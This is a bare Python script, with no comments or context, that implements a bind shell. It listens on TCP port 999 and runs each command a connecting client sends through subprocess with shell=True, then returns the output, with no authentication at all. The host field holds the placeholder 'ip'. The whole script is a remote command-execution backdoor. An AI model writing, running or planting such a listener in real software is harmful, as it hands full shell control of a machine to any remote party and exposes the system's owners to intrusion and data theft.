import subprocess
import socket

def main():
    host = 'ip'
    port = 999
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((host, port))
    s.listen(1)
    print(f"Listening on port {port}...")
    while True:
        conn, addr = s.accept()
        print(f"Connected to client: {addr[0]}:{addr[1]}")
        
        while True:
            try:
                command = conn.recv(1024).decode().strip()
                if not command:
                    break
            

                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                output, error = proc.communicate()
                

                conn.sendall(output)
                conn.sendall(error)
            except Exception as e:
                conn.sendall(str(e).encode())
        

        conn.close()

if __name__ == "__main__":
    main()
